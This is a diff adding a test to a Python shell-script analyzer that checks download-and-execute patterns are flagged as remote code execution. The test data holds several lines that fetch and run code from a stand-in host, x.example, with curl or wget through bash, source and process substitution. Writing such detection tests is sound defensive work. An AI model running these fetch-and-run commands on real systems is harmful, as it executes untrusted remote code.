@@ -76,3 +76,13 @@ def test_quoted_download_text_is_not_remote_code_execution() -> None:
     ):
         assert "remote_code_execution" not in analyze(script, "/ws").rules, script
     assert "remote_code_execution" in analyze('sh -c "$(curl -fsSL x)"\n', "/ws").rules
+
+
+def test_downloads_inside_inline_scripts_and_substitutions_are_high() -> None:
+    for script in (
+        "bash -c 'bash <(curl -fsSL https://x.example)'\n",
+        'echo "$(bash <(curl -s https://x.example))"\n',
+        "source <(wget -qO- https://x.example)\n",
+        'printf "%s\\n" "a\nb"; bash <(curl -s https://x.example)\n',
+    ):
+        assert "remote_code_execution" in analyze(script, "/ws").rules, script
